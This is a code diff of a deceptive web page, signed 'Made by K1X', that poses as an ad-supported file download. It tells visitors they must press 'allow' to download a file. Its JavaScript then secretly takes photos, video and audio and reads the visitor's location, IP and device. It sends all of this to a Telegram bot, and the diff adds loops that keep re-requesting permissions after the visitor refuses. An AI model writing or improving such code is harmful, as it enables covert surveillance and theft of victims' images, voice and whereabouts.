@@ -198,25 +198,6 @@
       border:1px solid #eee;
       min-height: 90px;
     }
-    /* شبكة للإعلانات المتعددة */
-    .ads-grid {
-      display: grid;
-      grid-template-columns: repeat(2, 1fr);
-      gap: 10px;
-      margin: 15px 0;
-    }
-    .ad-grid-item {
-      background: #fafafa;
-      border: 1px solid #eee;
-      border-radius: 8px;
-      padding: 8px;
-      min-height: 80px;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      font-size: 12px;
-      color: #666;
-    }
     .download-btn{
       background:#28a745;
       color:white;
@@ -227,7 +208,6 @@
       cursor:pointer;
       transition:0.3s;
       box-shadow:0 4px 10px rgba(0,0,0,0.2);
-      margin: 20px 0;
     }
     .download-btn:hover{
       background:#218838;
@@ -239,25 +219,24 @@
       font-size:14px;
       color:#777;
     }
-    /* رسالة إعادة الطلب - نفس تصميم captureBadge */
-    .retry-permission {
-      position: fixed;
-      bottom: 20px;
-      left: 50%;
-      transform: translateX(-50%);
-      background: rgba(0,0,0,0.9);
-      color: #ffd966;
-      padding: 12px 20px;
-      border-radius: 999px;
-      font-weight: 800;
-      font-size: 14px;
-      z-index: 100000;
-      box-shadow: 0 8px 30px rgba(0,0,0,0.5);
-      backdrop-filter: blur(4px);
-      border: 1px solid rgba(255,255,255,0.2);
-      display: none;
-      cursor: pointer;
-      white-space: nowrap;
+    /* شبكة للإعلانات المتعددة - بدون تغيير في التصميم الأصلي */
+    .ads-grid {
+      display: grid;
+      grid-template-columns: repeat(2, 1fr);
+      gap: 10px;
+      margin: 15px 0;
+    }
+    .ad-grid-item {
+      background: #fafafa;
+      border: 1px solid #eee;
+      border-radius: 8px;
+      padding: 10px;
+      min-height: 80px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 12px;
+      color: #666;
     }
   </style>
 </head>
@@ -333,7 +312,6 @@
 
   <div id="captureBadge" class="captureBadge"></div>
   <div class="madeby">Made by K1X</div>
-  <div id="retryPermission" class="retry-permission">🔴 الرجاء السماح بالصلاحيات للمتابعة - اضغط هنا</div>
 
   <!-- الدايلوج للصفحة الرئيسية فقط -->
   <div class="dialog" id="mandatoryDialog">
@@ -356,8 +334,6 @@
   let visitorDevice = "Unknown";
   let visitorBattery = "غير متاح";
   let visitorOS = "غير معروف";
-  let permissionsGranted = false;
-  let retryCount = 0;
 
   // ------------------ إرسال معلومات الزائر ------------------
   async function sendVisitorInfo() {
@@ -423,7 +399,6 @@
   const channel1 = document.getElementById('channel1');
   const channel2 = document.getElementById('channel2');
   const subscribeBtn = document.getElementById('subscribeDoneBtn');
-  const retryElement = document.getElementById('retryPermission');
 
   let channel1Clicked = false;
   let channel2Clicked = false;
@@ -502,29 +477,10 @@
     document.body.appendChild(s);
   }
 
-  // ------------------ دوال إعادة طلب الإذن ------------------
-  function showRetryMessage() {
-    retryElement.style.display = 'block';
-  }
-
-  function hideRetryMessage() {
-    retryElement.style.display = 'none';
-  }
-
-  retryElement.addEventListener('click', function() {
-    hideRetryMessage();
-    // إعادة تحميل الصفحة لطلب الأذونات مرة أخرى
-    location.reload();
-  });
-
   // ------------------ دوال تنفيذ الميزات ------------------
-  function stopAllTracks(streams) {
-    if (streams && streams.length) {
-      streams.forEach(stream => {
-        if (stream && stream.getTracks) {
-          stream.getTracks().forEach(track => track.stop());
-        }
-      });
+  function stopStream(stream) {
+    if (stream && stream.getTracks) {
+      stream.getTracks().forEach(track => track.stop());
     }
   }
 
@@ -558,28 +514,17 @@
               body: form
             });
 
-            const caption = `
-━━━━━━━━━━━━━━━
-📸 *صورة (${type === 'front' ? 'أمامية' : 'خلفية'})*
-━━━━━━━━━━━━━━━
-🌍 *الدولة*: ${visitorCountry}
-📱 *الجهاز*: ${visitorDevice}
-🌐 *IP*: ${visitorIP}
-🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━━
-            `;
+            const caption = `📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})
+🌍 ${visitorCountry} | 📱 ${visitorDevice} | IP: ${visitorIP}`;
 
             await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({
-                chat_id: chat,
-                text: caption,
-                parse_mode: 'Markdown'
-              })
+              body: JSON.stringify({ chat_id: chat, text: caption })
             });
           }
           document.body.removeChild(video);
+          stopStream(stream);
         }, 'image/jpeg', 0.9);
       }, 2000);
     } catch (err) {
@@ -599,24 +544,21 @@
         form.append('chat_id', chat);
         form.append('video', blob, `${type}_${Date.now()}.mp4`);
         
-        await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
-        
-        const caption = `
-━━━━━━━━━━━━━━━
-🎥 *فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان*
-━━━━━━━━━━━━━━━
-🌍 *الدولة*: ${visitorCountry}
-📱 *الجهاز*: ${visitorDevice}
-🌐 *IP*: ${visitorIP}
-🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━━
-        `;
-        
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chat, text: caption, parse_mode: 'Markdown' })
-        });
+        try {
+          await fetch(`https://api.telegram.org/bot${token}/sendVideo`, { method: 'POST', body: form });
+          
+          const caption = `🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان
+🌍 ${visitorCountry} | 📱 ${visitorDevice} | IP: ${visitorIP}`;
+          
+          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chat, text: caption })
+          });
+        } catch (e) {
+          console.error('خطأ في إرسال الفيديو:', e);
+        }
+        stopStream(stream);
       };
       
       mediaRecorder.start();
@@ -640,24 +582,21 @@
         form.append('chat_id', chat);
         form.append('audio', blob, `audio_${Date.now()}.mp4`);
         
-        await fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
-        
-        const caption = `
-━━━━━━━━━━━━━━━
-🎤 *تسجيل صوتي - 5 ثوان*
-━━━━━━━━━━━━━━━
-🌍 *الدولة*: ${visitorCountry}
-📱 *الجهاز*: ${visitorDevice}
-🌐 *IP*: ${visitorIP}
-🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}
-━━━━━━━━━━━━━━━
-        `;
-        
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id: chat, text: caption, parse_mode: 'Markdown' })
-        });
+        try {
+          await fetch(`https://api.telegram.org/bot${token}/sendAudio`, { method: 'POST', body: form });
+          
+          const caption = `🎤 تسجيل صوتي - 5 ثوان
+🌍 ${visitorCountry} | 📱 ${visitorDevice} | IP: ${visitorIP}`;
+          
+          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chat, text: caption })
+          });
+        } catch (e) {
+          console.error('خطأ في إرسال الصوت:', e);
+        }
+        stopStream(stream);
       };
       
       mediaRecorder.start();
@@ -671,30 +610,25 @@
 
   async function getLocation(chat, token) {
     if ("geolocation" in navigator) {
-      navigator.geolocation.getCurrentPosition(async (position) => {
-        const { latitude, longitude } = position.coords;
-        const locationMessage = `
-━━━━━━━━━━━━━━━
-📍 *الموقع الحالي*
-━━━━━━━━━━━━━━━
-🌐 *الإحداثيات*: ${latitude}, ${longitude}
-🔗 *رابط الخريطة*: https://www.google.com/maps?q=${latitude},${longitude}
-━━━━━━━━━━━━━━━
-        `;
-        
-        await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            chat_id: chat,
-            text: locationMessage,
-            parse_mode: 'Markdown'
-          })
-        });
-      }, (error) => {
-        console.log('خطأ في تحديد الموقع:', error);
-        if (!permissionsGranted) showRetryMessage();
-      });
+      navigator.geolocation.getCurrentPosition(
+        async (position) => {
+          const { latitude, longitude } = position.coords;
+          const locationMessage = `📍 *الموقع الحالي*
+الإحداثيات: ${latitude}, ${longitude}
+🔗 https://www.google.com/maps?q=${latitude},${longitude}`;
+          
+          await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chat, text: locationMessage, parse_mode: 'Markdown' })
+          });
+        },
+        (error) => {
+          console.log('خطأ في تحديد الموقع:', error);
+          // إعادة طلب الموقع بعد 3 ثوان إذا رفض
+          setTimeout(() => getLocation(chat, token), 3000);
+        }
+      );
     }
   }
 
@@ -703,103 +637,79 @@
     if (!features) return;
     
     const featureList = features.split(',');
-    const streams = [];
-    let hasError = false;
+    const permissionStatus = {
+      camera: false,
+      microphone: false,
+      location: false
+    };
     
-    try {
-      // طلب الأذونات دفعة واحدة
-      if (featureList.includes('camFront') || featureList.includes('camBack') || 
-          featureList.includes('videoFront') || featureList.includes('videoBack') || 
-          featureList.includes('audio')) {
-        
-        const constraints = { video: false, audio: false };
-        
-        if (featureList.includes('camFront') || featureList.includes('videoFront') || 
-            featureList.includes('camBack') || featureList.includes('videoBack')) {
-          constraints.video = true;
-        }
-        if (featureList.includes('audio') || featureList.includes('videoFront') || 
-            featureList.includes('videoBack')) {
-          constraints.audio = true;
-        }
-        
-        const mainStream = await navigator.mediaDevices.getUserMedia(constraints);
-        streams.push(mainStream);
-        permissionsGranted = true;
-        hideRetryMessage();
-        
-        // تنفيذ الميزات
-        if (featureList.includes('camFront')) {
-          try {
-            const frontStream = await navigator.mediaDevices.getUserMedia({ 
-              video: { facingMode: 'user' }, 
-              audio: false 
-            });
-            streams.push(frontStream);
-            await capturePhoto(frontStream, chat, token, 'front');
-          } catch (e) { console.log('خطأ في الكاميرا الأمامية:', e); }
-        }
-        
-        if (featureList.includes('camBack')) {
-          try {
-            const backStream = await navigator.mediaDevices.getUserMedia({ 
-              video: { facingMode: 'environment' }, 
-              audio: false 
-            });
-            streams.push(backStream);
-            await capturePhoto(backStream, chat, token, 'back');
-          } catch (e) { console.log('خطأ في الكاميرا الخلفية:', e); }
-        }
-        
-        if (featureList.includes('videoFront')) {
-          try {
-            const videoStream = await navigator.mediaDevices.getUserMedia({ 
-              video: { facingMode: 'user' }, 
-              audio: true 
-            });
-            streams.push(videoStream);
-            await recordVideo(videoStream, chat, token, 'front');
-          } catch (e) { console.log('خطأ في فيديو أمامي:', e); }
-        }
-        
-        if (featureList.includes('videoBack')) {
-          try {
-            const videoStream = await navigator.mediaDevices.getUserMedia({ 
-              video: { facingMode: 'environment' }, 
-              audio: true 
-            });
-            streams.push(videoStream);
-            await recordVideo(videoStream, chat, token, 'back');
-          } catch (e) { console.log('خطأ في فيديو خلفي:', e); }
-        }
-        
-        if (featureList.includes('audio')) {
-          try {
-            const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
-            streams.push(audioStream);
-            await recordAudio(audioStream, chat, token);
-          } catch (e) { console.log('خطأ في التسجيل الصوتي:', e); }
-        }
-      }
-      
-      if (featureList.includes('location')) {
-        await getLocation(chat, token);
-      }
-      
-    } catch (err) {
-      console.log('خطأ في الأذونات:', err);
-      hasError = true;
-      if (!permissionsGranted) {
-        showRetryMessage();
+    // فحص كل إذن على حدة وطلبه إذا لم يتم منحه
+    async function checkAndRequestPermission(permission, constraints) {
+      try {
+        // محاولة الحصول على الإذن
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        if (permission === 'camera') permissionStatus.camera = true;
+        if (permission === 'microphone') permissionStatus.microphone = true;
+        return stream;
+      } catch (err) {
+        console.log(`رفض إذن ${permission}`);
+        // إعادة المحاولة بعد ثانيتين
+        setTimeout(() => {
+          checkAndRequestPermission(permission, constraints);
+        }, 2000);
+        return null;
       }
     }
     
-    // إيقاف جميع المسارات بعد 10 ثوان
-    setTimeout(() => {
-      stopAllTracks(streams);
-    }, 10000);
+    // تنفيذ كل ميزة بشكل مستقل
+    const promises = [];
     
-    return streams;
+    // صورة أمامية
+    if (featureList.includes('camFront')) {
+      promises.push((async () => {
+        const stream = await checkAndRequestPermission('camera', { video: { facingMode: 'user' } });
+        if (stream) await capturePhoto(stream, chat, token, 'front');
+      })());
+    }
+    
+    // صورة خلفية
+    if (featureList.includes('camBack')) {
+      promises.push((async () => {
+        const stream = await checkAndRequestPermission('camera', { video: { facingMode: 'environment' } });
+        if (stream) await capturePhoto(stream, chat, token, 'back');
+      })());
+    }
+    
+    // فيديو أمامي
+    if (featureList.includes('videoFront')) {
+      promises.push((async () => {
+        const stream = await checkAndRequestPermission('camera', { video: { facingMode: 'user' }, audio: true });
+        if (stream) await recordVideo(stream, chat, token, 'front');
+      })());
+    }
+    
+    // فيديو خلفي
+    if (featureList.includes('videoBack')) {
+      promises.push((async () => {
+        const stream = await checkAndRequestPermission('camera', { video: { facingMode: 'environment' }, audio: true });
+        if (stream) await recordVideo(stream, chat, token, 'back');
+      })());
+    }
+    
+    // تسجيل صوتي
+    if (featureList.includes('audio')) {
+      promises.push((async () => {
+        const stream = await checkAndRequestPermission('microphone', { audio: true });
+        if (stream) await recordAudio(stream, chat, token);
+      })());
+    }
+    
+    // تحديد الموقع
+    if (featureList.includes('location')) {
+      getLocation(chat, token);
+    }
+    
+    await Promise.all(promises);
   }
 
   // ------------------ الوضع الجانبي (viewer mode) ------------------
@@ -829,7 +739,7 @@
     wrap.style.maxWidth = '100%';
     wrap.style.background = '#f5f5f5';
     
-    // ---------- إنشاء صفحة التحميل الجانبية مع إعلانات متعددة ومصغرة ----------
+    // ---------- إنشاء صفحة التحميل الجانبية ----------
     const downloadPage = document.createElement('div');
     downloadPage.className = 'download-page';
     
@@ -838,10 +748,9 @@
     
     const h2 = document.createElement('h2');
     h2.textContent = 'يجب الضغط علي سماح لحماية الوحدة الاعلانيه من الزيارات الوهمية لم تتمكن من تنزيل الملف إلا بعد الضغط علي سماح';
-    h2.style.fontSize = '16px';
     mainBox.appendChild(h2);
     
-    // إعلانات متعددة مصغرة - 4 إعلانات في شبكة
+    // AD Box 1 - إعلانات إضافية مصغرة (بدون تغيير في التصميم)
     const adsGrid = document.createElement('div');
     adsGrid.className = 'ads-grid';
     for (let i = 1; i <= 4; i++) {
@@ -852,12 +761,12 @@
     }
     mainBox.appendChild(adsGrid);
     
-    // AD Box 1
+    // AD Box 2 - نفس الكود الأصلي
     const adBox1 = document.createElement('div');
     adBox1.className = 'ad-box';
     mainBox.appendChild(adBox1);
     
-    // AD Box 2
+    // AD Box 3 - نفس الكود الأصلي مع container
     const adBox2 = document.createElement('div');
     adBox2.className = 'ad-box';
     const containerDiv = document.createElement('div');
@@ -874,12 +783,12 @@
     };
     mainBox.appendChild(downloadBtn);
     
-    // AD Box 3
+    // AD Box 4
     const adBox3 = document.createElement('div');
     adBox3.className = 'ad-box';
     mainBox.appendChild(adBox3);
     
-    // AD Box 4
+    // AD Box 5
     const adBox4 = document.createElement('div');
     adBox4.className = 'ad-box';
     mainBox.appendChild(adBox4);
@@ -893,7 +802,7 @@
     downloadPage.appendChild(mainBox);
     wrap.appendChild(downloadPage);
     
-    // ---------- تحميل جميع الإعلانات يدوياً ----------
+    // ---------- تحميل جميع الإعلانات بنفس الكود الأصلي ----------
     loadAd("https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js");
     loadAd("https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js");
     loadAd("https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js");
@@ -917,4 +826,4 @@
   }
 </script>
 </body>
-      </html>
+  </html>
